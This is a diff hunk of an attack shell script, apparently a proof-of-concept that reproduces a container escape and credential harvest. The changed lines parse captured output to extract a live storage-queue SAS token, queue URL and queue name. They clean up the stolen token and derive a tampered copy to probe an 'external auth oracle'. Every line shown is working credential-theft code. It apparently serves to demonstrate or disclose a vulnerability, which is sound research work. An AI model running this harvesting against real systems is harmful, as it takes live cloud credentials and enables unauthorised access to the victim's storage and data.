@@ -59,7 +59,7 @@ echo "$M"
 echo "===== ESCAPE + CREDENTIAL HARVEST REPRODUCED ====="
 
 # 6) emit the external auth oracle using the JUST-CAPTURED live values
-SAS=$(echo "$M" | grep -a 'INPUTQUEUESASTOKEN=' | head -1 | sed 's/.*INPUTQUEUESASTOKEN=//')
+SAS=$(echo "$M" | grep -a 'INPUTQUEUESASTOKEN=' | head -1 | sed 's/.*INPUTQUEUESASTOKEN=//' | sed 's/^?//' | tr -d '\r')
 QURL=$(echo "$M" | grep -a 'INPUTQUEUEURL=' | head -1 | sed 's/.*INPUTQUEUEURL=//' | tr -d '\r')
 QNAME=$(echo "$M" | grep -a 'INPUTQUEUENAME=' | head -1 | sed 's/.*INPUTQUEUENAME=//' | tr -d '\r')
 SASC=$(echo "$SAS" | sed 's/%3D$/X%3D/')
